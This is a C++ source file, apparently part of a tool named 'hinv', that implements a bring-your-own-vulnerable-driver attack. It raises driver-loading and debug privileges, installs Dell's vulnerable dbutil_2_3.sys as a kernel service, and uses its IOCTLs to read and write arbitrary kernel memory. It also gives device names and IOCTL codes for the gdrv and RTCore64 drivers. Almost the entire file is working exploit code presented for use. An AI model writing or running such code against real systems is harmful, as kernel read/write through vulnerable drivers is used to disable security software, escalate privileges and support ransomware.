#include "hinv_byovd.hpp"
#include <iostream>
#include <cwctype>
#include <algorithm>
#include <cstring>

#pragma comment(lib, "advapi32.lib")

namespace hinv {
namespace byovd {

// ============================================================================
// Driver service helpers
// ============================================================================

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

static bool SetPrivilege(HANDLE hToken, LPCWSTR privilegeName) {
    TOKEN_PRIVILEGES tp{};
    LUID luid{};
    if (!LookupPrivilegeValueW(nullptr, privilegeName, &luid)) return false;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr) == TRUE;
}

static bool EnableRequiredPrivileges() {
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    SetPrivilege(hToken, SE_LOAD_DRIVER_NAME);
    SetPrivilege(hToken, SE_DEBUG_NAME);
    CloseHandle(hToken);
    return true;
}

bool InstallDriverService(const std::wstring& serviceName, const std::wstring& driverPath) {
    EnableRequiredPrivileges();
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return false;

    SC_HANDLE hSvc = CreateServiceW(
        hScm,
        serviceName.c_str(),
        serviceName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    );

    if (!hSvc) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
        }
    }

    bool ok = (hSvc != nullptr);
    if (hSvc) CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    return ok;
}

bool StartDriverService(const std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    bool ok = false;
    if (hSvc) {
        ok = (StartServiceW(hSvc, 0, nullptr) == TRUE) || (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING);
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
    return ok;
}

bool StopDriverService(const std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    bool ok = false;
    if (hSvc) {
        SERVICE_STATUS status{};
        ok = ControlService(hSvc, SERVICE_CONTROL_STOP, &status) == TRUE;
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
    return ok;
}

bool RemoveDriverService(const std::wstring& serviceName) {
    SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return false;
    SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
    bool ok = false;
    if (hSvc) {
        ok = DeleteService(hSvc) == TRUE;
        CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
    return ok;
}

// ============================================================================
// Dell dbutil_2_3.sys backend - arbitrary kernel virtual read/write
// ============================================================================

#pragma pack(push, 1)
struct DbUtilRwPacket {
    uint64_t address;
    uint32_t size;
    uint32_t padding;
    uint8_t  data[1];
};
#pragma pack(pop)

class DbUtilBackend : public IByovdBackend {
public:
    DriverProfile profile_;
    HANDLE        hDevice_ = INVALID_HANDLE_VALUE;
    std::wstring  serviceName_;
    std::wstring  driverPath_;

    ~DbUtilBackend() override { Shutdown(); }

    bool Initialize(const std::wstring& driverPath) override {
        driverPath_ = driverPath;
        serviceName_ = L"hinv_byovd_dbutil";

        if (!InstallDriverService(serviceName_, driverPath_)) {
            std::wcerr << L"[hinv::byovd] Failed to install dbutil service\n";
            return false;
        }
        if (!StartDriverService(serviceName_)) {
            std::wcerr << L"[hinv::byovd] Failed to start dbutil service\n";
            return false;
        }

        hDevice_ = CreateFileW(
            profile_.devicePath.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hDevice_ == INVALID_HANDLE_VALUE) {
            std::wcerr << L"[hinv::byovd] Failed to open dbutil device: " << GetLastError() << L"\n";
            return false;
        }

        uint32_t version = 0;
        DWORD bytes = 0;
        // GetVersion IOCTL; not required to work, used as ping.
        DeviceIoControl(hDevice_, 0x9B0C1F44, nullptr, 0, &version, sizeof(version), &bytes, nullptr);
        std::cout << "[hinv::byovd] dbutil backend ready (device opened)\n";
        return true;
    }

    void Shutdown() override {
        if (hDevice_ != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice_);
            hDevice_ = INVALID_HANDLE_VALUE;
        }
        if (!serviceName_.empty()) {
            StopDriverService(serviceName_);
            RemoveDriverService(serviceName_);
        }
    }

    bool IsReady() const override { return hDevice_ != INVALID_HANDLE_VALUE; }

    bool ReadKernelMemory(uint64_t kernelVa, void* out, size_t size) override {
        if (!IsReady() || size == 0) return false;
        constexpr size_t CHUNK = 0x1000;
        auto* dst = static_cast<uint8_t*>(out);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            std::vector<uint8_t> in(sizeof(DbUtilRwPacket) - 1, 0);
            auto* req = reinterpret_cast<DbUtilRwPacket*>(in.data());
            req->address = kernelVa + off;
            req->size = static_cast<uint32_t>(n);
            req->padding = 0;

            DWORD bytes = 0;
            if (!DeviceIoControl(hDevice_, profile_.readIoc, in.data(), static_cast<DWORD>(in.size()),
                                 dst + off, static_cast<DWORD>(n), &bytes, nullptr))
                return false;
        }
        return true;
    }

    bool WriteKernelMemory(uint64_t kernelVa, const void* inBuf, size_t size) override {
        if (!IsReady() || size == 0) return false;
        constexpr size_t CHUNK = 0x1000;
        const auto* src = static_cast<const uint8_t*>(inBuf);
        for (size_t off = 0; off < size; off += CHUNK) {
            size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
            std::vector<uint8_t> buf(sizeof(DbUtilRwPacket) - 1 + n, 0);
            auto* req = reinterpret_cast<DbUtilRwPacket*>(buf.data());
            req->address = kernelVa + off;
            req->size = static_cast<uint32_t>(n);
            req->padding = 0;
            std::memcpy(req->data, src + off, n);

            DWORD bytes = 0;
            if (!DeviceIoControl(hDevice_, profile_.writeIoc, buf.data(), static_cast<DWORD>(buf.size()),
                                 nullptr, 0, &bytes, nullptr))
                return false;
        }
        return true;
    }
};

// ============================================================================
// Profile detection & factory
// ============================================================================

DriverProfile DetectProfile(const std::wstring& driverFileName) {
    std::wstring lower = ToLower(driverFileName);

    if (lower.find(L"dbutil") != std::wstring::npos) {
        return {
            BackendType::DbUtil,
            L"hinv_byovd_dbutil",
            L"\\\\.\\DBUtil_2_3",
            driverFileName,
            0x9B0C1EC4,
            0x9B0C1EC8,
            0,
            0
        };
    }

    if (lower.find(L"gdrv") != std::wstring::npos) {
        return {
            BackendType::GDrv,
            L"hinv_byovd_gdrv",
            L"\\\\.\\GDrvDriver",
            driverFileName,
            0x222010, // virtual read (research-backed placeholder)
            0x22200C, // virtual write
            0x222004,
            0x222008
        };
    }

    if (lower.find(L"rtcore") != std::wstring::npos) {
        return {
            BackendType::RTCore64,
            L"hinv_byovd_rtcore",
            L"\\\\.\\RTCore64",
            driverFileName,
            0x80002048,
            0x8000204C,
            0x80002040,
            0x80002044
        };
    }

    return { BackendType::Unknown };
}

std::unique_ptr<IByovdBackend> CreateBackend(const DriverProfile& profile) {
    if (profile.type == BackendType::DbUtil) {
        auto backend = std::make_unique<DbUtilBackend>();
        backend->profile_ = profile;
        return backend;
    }
    return nullptr;
}

std::unique_ptr<IByovdBackend> LoadVulnerableDriver(const std::wstring& driverPath) {
    size_t pos = driverPath.find_last_of(L"\\/");
    std::wstring fileName = (pos == std::wstring::npos) ? driverPath : driverPath.substr(pos + 1);
    DriverProfile profile = DetectProfile(fileName);
    if (profile.type == BackendType::Unknown) {
        std::wcerr << L"[hinv::byovd] Unknown vulnerable driver: " << fileName << L"\n";
        return nullptr;
    }
    auto backend = CreateBackend(profile);
    if (backend && !backend->Initialize(driverPath)) {
        backend.reset();
    }
    return backend;
}

} // namespace byovd
} // namespace hinv
